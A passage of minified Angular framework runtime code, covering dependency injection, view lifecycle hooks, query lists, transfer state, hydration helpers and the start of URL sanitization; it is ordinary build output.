            py(i.value) &&
            this._ngOnDestroyHooks.add(i.value),
          i.value
        );
      } finally {
        z(n);
      }
    }
    injectableDefInScope(e) {
      if (!e.providedIn) return !1;
      let i = ke(e.providedIn);
      return "string" == typeof i
        ? "any" === i || this.scopes.has(i)
        : this.injectorDefTypes.has(i);
    }
    removeOnDestroy(e) {
      let i = this._onDestroyHooks.indexOf(e);
      -1 !== i && this._onDestroyHooks.splice(i, 1);
    }
  };
function sc(t) {
  let e = cs(t),
    i = null !== e ? e.factory : qn(t);
  if (null !== i) return i;
  if (t instanceof b) throw new D(204, !1);
  if (t instanceof Function) return uy(t);
  throw new D(204, !1);
}
function uy(t) {
  if (t.length > 0) throw new D(204, !1);
  let i = b_(t);
  return null !== i ? () => i.factory(t) : () => new t();
}
function dy(t) {
  if (_h(t)) return Un(void 0, t.useValue);
  return Un(fy(t), To);
}
function fy(t, e, i) {
  let n;
  if (oc(t)) {
    let r = ke(t);
    return qn(r) || sc(r);
  }
  if (_h(t)) n = () => ke(t.useValue);
  else if (cy(t)) n = () => t.useFactory(...nc(t.deps || []));
  else if (ay(t)) n = () => h(ke(t.useExisting));
  else {
    let r = ke(t && (t.useClass || t.provide));
    if (!hy(t)) return qn(r) || sc(r);
    n = () => new r(...nc(t.deps));
  }
  return n;
}
function Un(t, e, i = !1) {
  return { factory: t, value: e, multi: i ? [] : void 0 };
}
function hy(t) {
  return !!t.deps;
}
function py(t) {
  return (
    null !== t && "object" == typeof t && "function" == typeof t.ngOnDestroy
  );
}
function gy(t) {
  return "function" == typeof t || ("object" == typeof t && t instanceof b);
}
function ac(t, e) {
  for (let i of t)
    Array.isArray(i) ? ac(i, e) : i && eh(i) ? ac(i.ɵproviders, e) : e(i);
}
function dt(t, e) {
  t instanceof ki && t.assertNotDestroyed();
  let n = jt(t),
    r = Ne(void 0);
  try {
    return e();
  } finally {
    jt(n), Ne(r);
  }
}
function yh() {
  return void 0 !== th() || null != N_();
}
function my(t) {
  if (!yh()) throw new D(-203, !1);
}
function vy(t) {
  let e = Ce.ng;
  if (e && e.ɵcompilerFacade) return e.ɵcompilerFacade;
  throw new Error("JIT compiler unavailable");
}
function _y(t) {
  return "function" == typeof t;
}
var Pe = 0,
  k = 1,
  I = 2,
  fe = 3,
  Ye = 4,
  Je = 5,
  Ze = 6,
  Fi = 7,
  Qe = 8,
  Zn = 9,
  Ke = 10,
  ne = 11,
  Li = 12,
  vf = 13,
  ei = 14,
  Fe = 15,
  Yi = 16,
  $n = 17,
  wt = 18,
  fs = 19,
  Ch = 20,
  Vt = 21,
  $a = 22,
  ln = 23,
  Se = 25,
  wh = 1,
  ji = 6,
  bt = 7,
  Uo = 8,
  Qn = 9,
  Ee = 10,
  el = (function (t) {
    return (
      (t[(t.None = 0)] = "None"),
      (t[(t.HasTransplantedViews = 2)] = "HasTransplantedViews"),
      t
    );
  })(el || {});
function Ct(t) {
  return Array.isArray(t) && "object" == typeof t[wh];
}
function ft(t) {
  return Array.isArray(t) && !0 === t[wh];
}
function bh(t) {
  return !!(4 & t.flags);
}
function Zi(t) {
  return t.componentOffset > -1;
}
function tl(t) {
  return !(1 & ~t.flags);
}
function un(t) {
  return !!t.template;
}
function Mh(t) {
  return !!(512 & t[I]);
}
var cc = class {
  constructor(e, i, n) {
    (this.previousValue = e), (this.currentValue = i), (this.firstChange = n);
  }
  isFirstChange() {
    return this.firstChange;
  }
};
function Dh(t, e, i, n) {
  null !== e ? e.applyValueToInputSignal(e, n) : (t[i] = n);
}
function Dt() {
  return xh;
}
function xh(t) {
  return t.type.prototype.ngOnChanges && (t.setInput = Cy), yy;
}
function yy() {
  let t = Oh(this),
    e = t?.current;
  if (e) {
    let i = t.previous;
    if (i === Yn) t.previous = e;
    else for (let n in e) i[n] = e[n];
    (t.current = null), this.ngOnChanges(e);
  }
}
function Cy(t, e, i, n, r) {
  let o = this.declaredInputs[n],
    s = Oh(t) || wy(t, { previous: Yn, current: null }),
    a = s.current || (s.current = {}),
    c = s.previous,
    l = c[o];
  (a[o] = new cc(l && l.currentValue, i, c === Yn)), Dh(t, e, r, i);
}
Dt.ngInherit = !0;
var Eh = "__ngSimpleChanges__";
function Oh(t) {
  return t[Eh] || null;
}
function wy(t, e) {
  return (t[Eh] = e);
}
var _f = null,
  at = function (t, e, i) {
    _f?.(t, e, i);
  },
  by = "svg",
  My = "math",
  Dy = !1;
function xy() {
  return Dy;
}
function Xe(t) {
  for (; Array.isArray(t); ) t = t[Pe];
  return t;
}
function Ey(t, e) {
  return Xe(e[t]);
}
function Te(t, e) {
  return Xe(e[t.index]);
}
function Ih(t, e) {
  return t.data[e];
}
function $t(t, e) {
  let i = e[t];
  return Ct(i) ? i : i[Pe];
}
function Oy(t) {
  return !(4 & ~t[I]);
}
function nl(t) {
  return !(128 & ~t[I]);
}
function Iy(t) {
  return ft(t[fe]);
}
function $o(t, e) {
  return null == e ? null : t[e];
}
function Ph(t) {
  t[$n] = 0;
}
function Py(t) {
  1024 & t[I] || ((t[I] |= 1024), nl(t) && Vi(t));
}
function Sy(t, e) {
  for (; t > 0; ) (e = e[ei]), t--;
  return e;
}
function il(t) {
  return !!(9216 & t[I] || t[ln]?.dirty);
}
function lc(t) {
  t[Ke].changeDetectionScheduler?.notify(1),
    il(t)
      ? Vi(t)
      : 64 & t[I] &&
        (xy()
          ? ((t[I] |= 1024), Vi(t))
          : t[Ke].changeDetectionScheduler?.notify());
}
function Vi(t) {
  t[Ke].changeDetectionScheduler?.notify();
  let e = Bi(t);
  for (; null !== e && !(8192 & e[I]) && ((e[I] |= 8192), nl(e)); ) e = Bi(e);
}
function Sh(t, e) {
  if (!(256 & ~t[I])) throw new D(911, !1);
  null === t[Vt] && (t[Vt] = []), t[Vt].push(e);
}
function Ty(t, e) {
  if (null === t[Vt]) return;
  let i = t[Vt].indexOf(e);
  -1 !== i && t[Vt].splice(i, 1);
}
function Bi(t) {
  let e = t[fe];
  return ft(e) ? e[fe] : e;
}
var V = { lFrame: Lh(null), bindingsEnabled: !0, skipHydrationRootTNode: null };
function Ay() {
  return V.lFrame.elementDepthCount;
}
function Ry() {
  V.lFrame.elementDepthCount++;
}
function Ny() {
  V.lFrame.elementDepthCount--;
}
function Th() {
  return V.bindingsEnabled;
}
function Qi() {
  return null !== V.skipHydrationRootTNode;
}
function ky(t) {
  return V.skipHydrationRootTNode === t;
}
function Fy(t) {
  V.skipHydrationRootTNode = t;
}
function Ly() {
  V.skipHydrationRootTNode = null;
}
function X() {
  return V.lFrame.lView;
}
function je() {
  return V.lFrame.tView;
}
function ti(t) {
  return (V.lFrame.contextLView = t), t[Qe];
}
function ni(t) {
  return (V.lFrame.contextLView = null), t;
}
function Ve() {
  let t = Ah();
  for (; null !== t && 64 === t.type; ) t = t.parent;
  return t;
}
function Ah() {
  return V.lFrame.currentTNode;
}
function jy() {
  let t = V.lFrame,
    e = t.currentTNode;
  return t.isParent ? e : e.parent;
}
function Ki(t, e) {
  let i = V.lFrame;
  (i.currentTNode = t), (i.isParent = e);
}
function Rh() {
  return V.lFrame.isParent;
}
function Vy() {
  V.lFrame.isParent = !1;
}
function By(t) {
  return (V.lFrame.bindingIndex = t);
}
function rl() {
  return V.lFrame.bindingIndex++;
}
function Uy(t) {
  let e = V.lFrame,
    i = e.bindingIndex;
  return (e.bindingIndex = e.bindingIndex + t), i;
}
function $y() {
  return V.lFrame.inI18n;
}
function Hy(t, e) {
  let i = V.lFrame;
  (i.bindingIndex = i.bindingRootIndex = t), uc(e);
}
function zy() {
  return V.lFrame.currentDirectiveIndex;
}
function uc(t) {
  V.lFrame.currentDirectiveIndex = t;
}
function Wy(t) {
  let e = V.lFrame.currentDirectiveIndex;
  return -1 === e ? null : t[e];
}
function Nh() {
  return V.lFrame.currentQueryIndex;
}
function ol(t) {
  V.lFrame.currentQueryIndex = t;
}
function Gy(t) {
  let e = t[k];
  return 2 === e.type ? e.declTNode : 1 === e.type ? t[Je] : null;
}
function kh(t, e, i) {
  if (i & j.SkipSelf) {
    let r = e,
      o = t;
    for (
      ;
      ((r = r.parent), null === r && !(i & j.Host)) &&
      ((r = Gy(o)), !(null === r || ((o = o[ei]), 10 & r.type)));

    );
    if (null === r) return !1;
    (e = r), (t = o);
  }
  let n = (V.lFrame = Fh());
  return (n.currentTNode = e), (n.lView = t), !0;
}
function sl(t) {
  let e = Fh(),
    i = t[k];
  (V.lFrame = e),
    (e.currentTNode = i.firstChild),
    (e.lView = t),
    (e.tView = i),
    (e.contextLView = t),
    (e.bindingIndex = i.bindingStartIndex),
    (e.inI18n = !1);
}
function Fh() {
  let t = V.lFrame,
    e = null === t ? null : t.child;
  return null === e ? Lh(t) : e;
}
function Lh(t) {
  let e = {
    currentTNode: null,
    isParent: !0,
    lView: null,
    tView: null,
    selectedIndex: -1,
    contextLView: null,
    elementDepthCount: 0,
    currentNamespace: null,
    currentDirectiveIndex: -1,
    bindingRootIndex: -1,
    bindingIndex: -1,
    currentQueryIndex: 0,
    parent: t,
    child: null,
    inI18n: !1,
  };
  return null !== t && (t.child = e), e;
}
function jh() {
  let t = V.lFrame;
  return (V.lFrame = t.parent), (t.currentTNode = null), (t.lView = null), t;
}
var Vh = jh;
function al() {
  let t = jh();
  (t.isParent = !0),
    (t.tView = null),
    (t.selectedIndex = -1),
    (t.contextLView = null),
    (t.elementDepthCount = 0),
    (t.currentDirectiveIndex = -1),
    (t.currentNamespace = null),
    (t.bindingRootIndex = -1),
    (t.bindingIndex = -1),
    (t.currentQueryIndex = 0);
}
function qy(t) {
  return (V.lFrame.contextLView = Sy(t, V.lFrame.contextLView))[Qe];
}
function Xi() {
  return V.lFrame.selectedIndex;
}
function dn(t) {
  V.lFrame.selectedIndex = t;
}
function cl() {
  let t = V.lFrame;
  return Ih(t.tView, t.selectedIndex);
}
function Bh() {
  return V.lFrame.currentNamespace;
}
var Uh = !0;
function ll() {
  return Uh;
}
function ht(t) {
  Uh = t;
}
function Yy(t, e, i) {
  let { ngOnChanges: n, ngOnInit: r, ngDoCheck: o } = e.type.prototype;
  if (n) {
    let s = xh(e);
    (i.preOrderHooks ??= []).push(t, s),
      (i.preOrderCheckHooks ??= []).push(t, s);
  }
  r && (i.preOrderHooks ??= []).push(0 - t, r),
    o &&
      ((i.preOrderHooks ??= []).push(t, o),
      (i.preOrderCheckHooks ??= []).push(t, o));
}
function ul(t, e) {
  for (let i = e.directiveStart, n = e.directiveEnd; i < n; i++) {
    let o = t.data[i].type.prototype,
      {
        ngAfterContentInit: s,
        ngAfterContentChecked: a,
        ngAfterViewInit: c,
        ngAfterViewChecked: l,
        ngOnDestroy: u,
      } = o;
    s && (t.contentHooks ??= []).push(-i, s),
      a &&
        ((t.contentHooks ??= []).push(i, a),
        (t.contentCheckHooks ??= []).push(i, a)),
      c && (t.viewHooks ??= []).push(-i, c),
      l &&
        ((t.viewHooks ??= []).push(i, l), (t.viewCheckHooks ??= []).push(i, l)),
      null != u && (t.destroyHooks ??= []).push(i, u);
  }
}
function Ao(t, e, i) {
  $h(t, e, 3, i);
}
function Ro(t, e, i, n) {
  (3 & t[I]) === i && $h(t, e, i, n);
}
function Ha(t, e) {
  let i = t[I];
  (3 & i) === e && ((i &= 16383), (i += 1), (t[I] = i));
}
function $h(t, e, i, n) {
  let r = void 0 !== n ? 65535 & t[$n] : 0,
    o = n ?? -1,
    s = e.length - 1,
    a = 0;
  for (let c = r; c < s; c++)
    if ("number" == typeof e[c + 1]) {
      if (((a = e[c]), null != n && a >= n)) break;
    } else
      e[c] < 0 && (t[$n] += 65536),
        (a < o || -1 == o) &&
          (Zy(t, i, e, c), (t[$n] = (4294901760 & t[$n]) + c + 2)),
        c++;
}
function yf(t, e) {
  at(4, t, e);
  let i = z(null);
  try {
    e.call(t);
  } finally {
    z(i), at(5, t, e);
  }
}
function Zy(t, e, i, n) {
  let r = i[n] < 0,
    o = i[n + 1],
    a = t[r ? -i[n] : i[n]];
  r
    ? t[I] >> 14 < t[$n] >> 16 &&
      (3 & t[I]) === e &&
      ((t[I] += 16384), yf(a, o))
    : yf(a, o);
}
var Gn = -1,
  Ui = class {
    constructor(e, i, n) {
      (this.factory = e),
        (this.resolving = !1),
        (this.canSeeViewProviders = i),
        (this.injectImpl = n);
    }
  };
function Qy(t) {
  return t instanceof Ui;
}
function Ky(t) {
  return !!(8 & t.flags);
}
function Xy(t) {
  return !!(16 & t.flags);
}
function Hh(t) {
  return t !== Gn;
}
function Ho(t) {
  return 32767 & t;
}
function Jy(t) {
  return t >> 16;
}
function zo(t, e) {
  let i = Jy(t),
    n = e;
  for (; i > 0; ) (n = n[ei]), i--;
  return n;
}
var dc = !0;
function Cf(t) {
  let e = dc;
  return (dc = t), e;
}
var eC = 256,
  zh = eC - 1,
  Wh = 5,
  tC = 0,
  ct = {};
function nC(t, e, i) {
  let n;
  "string" == typeof i
    ? (n = i.charCodeAt(0) || 0)
    : i.hasOwnProperty(Ti) && (n = i[Ti]),
    null == n && (n = i[Ti] = tC++);
  let r = n & zh,
    o = 1 << r;
  e.data[t + (r >> Wh)] |= o;
}
function Gh(t, e) {
  let i = qh(t, e);
  if (-1 !== i) return i;
  let n = e[k];
  n.firstCreatePass &&
    ((t.injectorIndex = e.length),
    za(n.data, t),
    za(e, null),
    za(n.blueprint, null));
  let r = dl(t, e),
    o = t.injectorIndex;
  if (Hh(r)) {
    let s = Ho(r),
      a = zo(r, e),
      c = a[k].data;
    for (let l = 0; l < 8; l++) e[o + l] = a[s + l] | c[s + l];
  }
  return (e[o + 8] = r), o;
}
function za(t, e) {
  t.push(0, 0, 0, 0, 0, 0, 0, 0, e);
}
function qh(t, e) {
  return -1 === t.injectorIndex ||
    (t.parent && t.parent.injectorIndex === t.injectorIndex) ||
    null === e[t.injectorIndex + 8]
    ? -1
    : t.injectorIndex;
}
function dl(t, e) {
  if (t.parent && -1 !== t.parent.injectorIndex) return t.parent.injectorIndex;
  let i = 0,
    n = null,
    r = e;
  for (; null !== r; ) {
    if (((n = Xh(r)), null === n)) return Gn;
    if ((i++, (r = r[ei]), -1 !== n.injectorIndex))
      return n.injectorIndex | (i << 16);
  }
  return Gn;
}
function iC(t, e, i) {
  nC(t, e, i);
}
function rC(t, e) {
  if ("class" === e) return t.classes;
  if ("style" === e) return t.styles;
  let i = t.attrs;
  if (i) {
    let n = i.length,
      r = 0;
    for (; r < n; ) {
      let o = i[r];
      if (ch(o)) break;
      if (0 === o) r += 2;
      else if ("number" == typeof o)
        for (r++; r < n && "string" == typeof i[r]; ) r++;
      else {
        if (o === e) return i[r + 1];
        r += 2;
      }
    }
  }
  return null;
}
function Yh(t, e, i) {
  if (i & j.Optional || void 0 !== t) return t;
  Yc(e, "NodeInjector");
}
function Zh(t, e, i, n) {
  if (
    (i & j.Optional && void 0 === n && (n = null), !(i & (j.Self | j.Host)))
  ) {
    let r = t[Zn],
      o = Ne(void 0);
    try {
      return r ? r.get(e, n, i & j.Optional) : nh(e, n, i & j.Optional);
    } finally {
      Ne(o);
    }
  }
  return Yh(n, e, i);
}
function Qh(t, e, i, n = j.Default, r) {
  if (null !== t) {
    if (2048 & e[I] && !(n & j.Self)) {
      let s = cC(t, e, i, n, ct);
      if (s !== ct) return s;
    }
    let o = Kh(t, e, i, n, ct);
    if (o !== ct) return o;
  }
  return Zh(e, i, n, r);
}
function Kh(t, e, i, n, r) {
  let o = sC(i);
  if ("function" == typeof o) {
    if (!kh(e, t, n)) return n & j.Host ? Yh(r, i, n) : Zh(e, i, n, r);
    try {
      let s;
      if (((s = o(n)), null != s || n & j.Optional)) return s;
      Yc(i);
    } finally {
      Vh();
    }
  } else if ("number" == typeof o) {
    let s = null,
      a = qh(t, e),
      c = Gn,
      l = n & j.Host ? e[Fe][Je] : null;
    for (
      (-1 === a || n & j.SkipSelf) &&
      ((c = -1 === a ? dl(t, e) : e[a + 8]),
      c !== Gn && bf(n, !1)
        ? ((s = e[k]), (a = Ho(c)), (e = zo(c, e)))
        : (a = -1));
      -1 !== a;

    ) {
      let u = e[k];
      if (wf(o, a, u.data)) {
        let d = oC(a, e, i, s, n, l);
        if (d !== ct) return d;
      }
      (c = e[a + 8]),
        c !== Gn && bf(n, e[k].data[a + 8] === l) && wf(o, a, e)
          ? ((s = u), (a = Ho(c)), (e = zo(c, e)))
          : (a = -1);
    }
  }
  return r;
}
function oC(t, e, i, n, r, o) {
  let s = e[k],
    a = s.data[t + 8],
    u = No(
      a,
      s,
      i,
      null == n ? Zi(a) && dc : n != s && !!(3 & a.type),
      r & j.Host && o === a
    );
  return null !== u ? Kn(e, s, u, a) : ct;
}
function No(t, e, i, n, r) {
  let o = t.providerIndexes,
    s = e.data,
    a = 1048575 & o,
    c = t.directiveStart,
    l = t.directiveEnd,
    u = o >> 20,
    f = r ? a + u : l;
  for (let m = n ? a : a + u; m < f; m++) {
    let w = s[m];
    if ((m < c && i === w) || (m >= c && w.type === i)) return m;
  }
  if (r) {
    let m = s[c];
    if (m && un(m) && m.type === i) return c;
  }
  return null;
}
function Kn(t, e, i, n) {
  let r = t[i],
    o = e.data;
  if (Qy(r)) {
    let s = r;
    s.resolving && P_(I_(o[i]));
    let a = Cf(s.canSeeViewProviders);
    s.resolving = !0;
    let l = s.injectImpl ? Ne(s.injectImpl) : null;
    kh(t, n, j.Default);
    try {
      (r = t[i] = s.factory(void 0, o, t, n)),
        e.firstCreatePass && i >= n.directiveStart && Yy(i, o[i], e);
    } finally {
      null !== l && Ne(l), Cf(a), (s.resolving = !1), Vh();
    }
  }
  return r;
}
function sC(t) {
  if ("string" == typeof t) return t.charCodeAt(0) || 0;
  let e = t.hasOwnProperty(Ti) ? t[Ti] : void 0;
  return "number" == typeof e ? (e >= 0 ? e & zh : aC) : e;
}
function wf(t, e, i) {
  let n = 1 << t;
  return !!(i[e + (t >> Wh)] & n);
}
function bf(t, e) {
  return !(t & j.Self || (t & j.Host && e));
}
var an = class {
  constructor(e, i) {
    (this._tNode = e), (this._lView = i);
  }
  get(e, i, n) {
    return Qh(this._tNode, this._lView, e, ls(n), i);
  }
};
function aC() {
  return new an(Ve(), X());
}
function Ji(t) {
  return Wi(() => {
    let e = t.prototype.constructor,
      i = e[Lo] || fc(e),
      n = Object.prototype,
      r = Object.getPrototypeOf(t.prototype).constructor;
    for (; r && r !== n; ) {
      let o = r[Lo] || fc(r);
      if (o && o !== i) return o;
      r = Object.getPrototypeOf(r);
    }
    return (o) => new o();
  });
}
function fc(t) {
  return Qf(t)
    ? () => {
        let e = fc(ke(t));
        return e && e();
      }
    : qn(t);
}
function cC(t, e, i, n, r) {
  let o = t,
    s = e;
  for (; null !== o && null !== s && 2048 & s[I] && !(512 & s[I]); ) {
    let a = Kh(o, s, i, n | j.Self, ct);
    if (a !== ct) return a;
    let c = o.parent;
    if (!c) {
      let l = s[Ch];
      if (l) {
        let u = l.get(i, ct, n);
        if (u !== ct) return u;
      }
      (c = Xh(s)), (s = s[ei]);
    }
    o = c;
  }
  return r;
}
function Xh(t) {
  let e = t[k],
    i = e.type;
  return 2 === i ? e.declTNode : 1 === i ? t[Je] : null;
}
function fl(t) {
  return rC(Ve(), t);
}
function Mf(t, e = null, i = null, n) {
  let r = Jh(t, e, i, n);
  return r.resolveInjectorInitializers(), r;
}
function Jh(t, e = null, i = null, n, r = new Set()) {
  let o = [i || Ie, oy(t)];
  return (
    (n = n || ("object" == typeof t ? void 0 : we(t))),
    new ki(o, e || Jc(), n || null, r)
  );
}
var re = (() => {
    let e = class e {
      static create(n, r) {
        if (Array.isArray(n)) return Mf({ name: "" }, r, n, "");
        {
          let o = n.name ?? "";
          return Mf({ name: o }, n.parent, n.providers, o);
        }
      }
    };
    return (
      (e.THROW_IF_NOT_FOUND = Ri),
      (e.NULL = new Bo()),
      (e.ɵprov = y({ token: e, providedIn: "any", factory: () => h(oh) })),
      (e.__NG_ELEMENT_ID__ = -1),
      e
    );
  })(),
  lC = "ngOriginalError";
function Wa(t) {
  return t[lC];
}
var ut = class {
    constructor() {
      this._console = console;
    }
    handleError(e) {
      let i = this._findOriginalError(e);
      this._console.error("ERROR", e),
        i && this._console.error("ORIGINAL ERROR", i);
    }
    _findOriginalError(e) {
      let i = e && Wa(e);
      for (; i && Wa(i); ) i = Wa(i);
      return i || null;
    }
  },
  ep = new b("", {
    providedIn: "root",
    factory: () => v(ut).handleError.bind(void 0),
  }),
  hl = (() => {
    let e = class e {};
    return (e.__NG_ELEMENT_ID__ = uC), (e.__NG_ENV_ID__ = (n) => n), e;
  })(),
  hc = class extends hl {
    constructor(e) {
      super(), (this._lView = e);
    }
    onDestroy(e) {
      return Sh(this._lView, e), () => Ty(this._lView, e);
    }
  };
function uC() {
  return new hc(X());
}
function dC() {
  return ii(Ve(), X());
}
function ii(t, e) {
  return new te(Te(t, e));
}
var te = (() => {
  let e = class e {
    constructor(n) {
      this.nativeElement = n;
    }
  };
  return (e.__NG_ELEMENT_ID__ = dC), e;
})();
function fC(t) {
  return t instanceof te ? t.nativeElement : t;
}
var pc = class extends N {
  constructor(e = !1) {
    super(),
      (this.destroyRef = void 0),
      (this.__isAsync = e),
      yh() && (this.destroyRef = v(hl, { optional: !0 }) ?? void 0);
  }
  emit(e) {
    let i = z(null);
    try {
      super.next(e);
    } finally {
      z(i);
    }
  }
  subscribe(e, i, n) {
    let r = e,
      o = i || (() => null),
      s = n;
    if (e && "object" == typeof e) {
      let c = e;
      (r = c.next?.bind(c)), (o = c.error?.bind(c)), (s = c.complete?.bind(c));
    }
    this.__isAsync && ((o = Ga(o)), r && (r = Ga(r)), s && (s = Ga(s)));
    let a = super.subscribe({ next: r, error: o, complete: s });
    return e instanceof Y && e.add(a), a;
  }
};
function Ga(t) {
  return (e) => {
    setTimeout(t, void 0, e);
  };
}
var K = pc;
function hC() {
  return this._results[Symbol.iterator]();
}
var Wo = class t {
    get changes() {
      return (this._changes ??= new K());
    }
    constructor(e = !1) {
      (this._emitDistinctChangesOnly = e),
        (this.dirty = !0),
        (this._onDirty = void 0),
        (this._results = []),
        (this._changesDetected = !1),
        (this._changes = void 0),
        (this.length = 0),
        (this.first = void 0),
        (this.last = void 0);
      let i = t.prototype;
      i[Symbol.iterator] || (i[Symbol.iterator] = hC);
    }
    get(e) {
      return this._results[e];
    }
    map(e) {
      return this._results.map(e);
    }
    filter(e) {
      return this._results.filter(e);
    }
    find(e) {
      return this._results.find(e);
    }
    reduce(e, i) {
      return this._results.reduce(e, i);
    }
    forEach(e) {
      this._results.forEach(e);
    }
    some(e) {
      return this._results.some(e);
    }
    toArray() {
      return this._results.slice();
    }
    toString() {
      return this._results.toString();
    }
    reset(e, i) {
      this.dirty = !1;
      let n = B_(e);
      (this._changesDetected = !V_(this._results, n, i)) &&
        ((this._results = n),
        (this.length = n.length),
        (this.last = n[this.length - 1]),
        (this.first = n[0]));
    }
    notifyOnChanges() {
      void 0 !== this._changes &&
        (this._changesDetected || !this._emitDistinctChangesOnly) &&
        this._changes.emit(this);
    }
    onDirty(e) {
      this._onDirty = e;
    }
    setDirty() {
      (this.dirty = !0), this._onDirty?.();
    }
    destroy() {
      void 0 !== this._changes &&
        (this._changes.complete(), this._changes.unsubscribe());
    }
  },
  pC = "ngSkipHydration",
  gC = "ngskiphydration";
function tp(t) {
  let e = t.mergedAttrs;
  if (null === e) return !1;
  for (let i = 0; i < e.length; i += 2) {
    let n = e[i];
    if ("number" == typeof n) return !1;
    if ("string" == typeof n && n.toLowerCase() === gC) return !0;
  }
  return !1;
}
function np(t) {
  return t.hasAttribute(pC);
}
function Go(t) {
  return !(128 & ~t.flags);
}
function mC(t) {
  if (Go(t)) return !0;
  let e = t.parent;
  for (; e; ) {
    if (Go(t) || tp(e)) return !0;
    e = e.parent;
  }
  return !1;
}
var ip = new Map(),
  vC = 0;
function _C() {
  return vC++;
}
function yC(t) {
  ip.set(t[fs], t);
}
function CC(t) {
  ip.delete(t[fs]);
}
var gc,
  Df = "__ngContext__";
function fn(t, e) {
  Ct(e) ? ((t[Df] = e[fs]), yC(e)) : (t[Df] = e);
}
function rp(t) {
  return sp(t[Li]);
}
function op(t) {
  return sp(t[Ye]);
}
function sp(t) {
  for (; null !== t && !ft(t); ) t = t[Ye];
  return t;
}
function ap(t) {
  gc = t;
}
function hs() {
  if (void 0 !== gc) return gc;
  if (typeof document < "u") return document;
  throw new D(210, !1);
}
var ri = new b("", { providedIn: "root", factory: () => wC }),
  wC = "ng",
  pl = new b(""),
  Me = new b("", { providedIn: "platform", factory: () => "unknown" }),
  oi = new b(""),
  er = new b("", {
    providedIn: "root",
    factory: () =>
      hs().body?.querySelector("[ngCspNonce]")?.getAttribute("ngCspNonce") ||
      null,
  });
function bC() {
  let t = new gn();
  return "browser" === v(Me) && (t.store = MC(hs(), v(ri))), t;
}
var gn = (() => {
  let e = class e {
    constructor() {
      (this.store = {}), (this.onSerializeCallbacks = {});
    }
    get(n, r) {
      return void 0 !== this.store[n] ? this.store[n] : r;
    }
    set(n, r) {
      this.store[n] = r;
    }
    remove(n) {
      delete this.store[n];
    }
    hasKey(n) {
      return this.store.hasOwnProperty(n);
    }
    get isEmpty() {
      return 0 === Object.keys(this.store).length;
    }
    onSerialize(n, r) {
      this.onSerializeCallbacks[n] = r;
    }
    toJson() {
      for (let n in this.onSerializeCallbacks)
        if (this.onSerializeCallbacks.hasOwnProperty(n))
          try {
            this.store[n] = this.onSerializeCallbacks[n]();
          } catch (r) {
            console.warn("Exception in onSerialize callback: ", r);
          }
      return JSON.stringify(this.store).replace(/</g, "\\u003C");
    }
  };
  return (e.ɵprov = y({ token: e, providedIn: "root", factory: bC })), e;
})();
function MC(t, e) {
  let i = t.getElementById(e + "-state");
  if (i?.textContent)
    try {
      return JSON.parse(i.textContent);
    } catch (n) {
      console.warn("Exception while restoring TransferState for app " + e, n);
    }
  return {};
}
var cp = "h",
  lp = "b",
  mc = (function (t) {
    return (t.FirstChild = "f"), (t.NextSibling = "n"), t;
  })(mc || {}),
  DC = "e",
  xC = "t",
  gl = "c",
  up = "x",
  qo = "r",
  EC = "i",
  OC = "n",
  IC = "d",
  PC = "__nghData__",
  dp = PC,
  qa = "ngh",
  SC = "nghm",
  fp = () => null;
function TC(t, e, i = !1) {
  let n = t.getAttribute(qa);
  if (null == n) return null;
  let [r, o] = n.split("|");
  if (((n = i ? o : r), !n)) return null;
  let a = i ? r : o ? `|${o}` : "",
    c = {};
  if ("" !== n) {
    let u = e.get(gn, null, { optional: !0 });
    null !== u && (c = u.get(dp, [])[Number(n)]);
  }
  let l = { data: c, firstChild: t.firstChild ?? null };
  return (
    i && ((l.firstChild = t), ps(l, 0, t.nextSibling)),
    a ? t.setAttribute(qa, a) : t.removeAttribute(qa),
    l
  );
}
function AC() {
  fp = TC;
}
function ml(t, e, i = !1) {
  return fp(t, e, i);
}
function RC(t) {
  let e = t._lView;
  return 2 === e[k].type ? null : (Mh(e) && (e = e[Se]), e);
}
function NC(t) {
  return t.textContent?.replace(/\s/gm, "");
}
function kC(t) {
  let n,
    e = hs(),
    i = e.createNodeIterator(t, NodeFilter.SHOW_COMMENT, {
      acceptNode(o) {
        let s = NC(o);
        return "ngetn" === s || "ngtns" === s
          ? NodeFilter.FILTER_ACCEPT
          : NodeFilter.FILTER_REJECT;
      },
    }),
    r = [];
  for (; (n = i.nextNode()); ) r.push(n);
  for (let o of r)
    "ngetn" === o.textContent
      ? o.replaceWith(e.createTextNode(""))
      : o.remove();
}
function ps(t, e, i) {
  (t.segmentHeads ??= {}), (t.segmentHeads[e] = i);
}
function vc(t, e) {
  return t.segmentHeads?.[e] ?? null;
}
function FC(t, e) {
  let i = t.data,
    n = i[DC]?.[e] ?? null;
  return null === n && i[gl]?.[e] && (n = vl(t, e)), n;
}
function hp(t, e) {
  return t.data[gl]?.[e] ?? null;
}
function vl(t, e) {
  let i = hp(t, e) ?? [],
    n = 0;
  for (let r of i) n += r[qo] * (r[up] ?? 1);
  return n;
}
function gs(t, e) {
  if (typeof t.disconnectedNodes > "u") {
    let i = t.data[IC];
    t.disconnectedNodes = i ? new Set(i) : null;
  }
  return !!t.disconnectedNodes?.has(e);
}
var Eo,
  xo = new b(""),
  pp = !1,
  gp = new b("", { providedIn: "root", factory: () => pp }),
  LC = new b("");
function jC() {
  if (void 0 === Eo && ((Eo = null), Ce.trustedTypes))
    try {
      Eo = Ce.trustedTypes.createPolicy("angular#unsafe-bypass", {
        createHTML: (t) => t,
        createScript: (t) => t,
        createScriptURL: (t) => t,
      });
    } catch {}
  return Eo;
}
function xf(t) {
  return jC()?.createScriptURL(t) || t;
}
var Yo = class {
  constructor(e) {
    this.changingThisBreaksApplicationSecurity = e;
  }
  toString() {
    return `SafeValue must use [property]=binding: ${this.changingThisBreaksApplicationSecurity} (see ${qf})`;
  }
};
function tr(t) {
  return t instanceof Yo ? t.changingThisBreaksApplicationSecurity : t;
}
function _l(t, e) {
  let i = VC(t);
  if (null != i && i !== e) {
    if ("ResourceURL" === i && "URL" === e) return !0;
    throw new Error(`Required a safe ${e}, got a ${i} (see ${qf})`);
  }
  return i === e;
}
function VC(t) {
  return (t instanceof Yo && t.getTypeName()) || null;
}
var BC = /^(?!javascript:)(?:[a-z0-9+.-]+:|[^&:\/?#]*(?:[\/?#]|$))/i;
function mp(t) {
  return (t = String(t)).match(BC) ? t : "unsafe:" + t;
}
var ms = (function (t) {
  return (
    (t[(t.NONE = 0)] = "NONE"),
    (t[(t.HTML = 1)] = "HTML"),
    (t[(t.STYLE = 2)] = "STYLE"),
    (t[(t.SCRIPT = 3)] = "SCRIPT"),
    (t[(t.URL = 4)] = "URL"),
    (t[(t.RESOURCE_URL = 5)] = "RESOURCE_URL"),
    t
  );
})(ms || {});
function nr(t) {
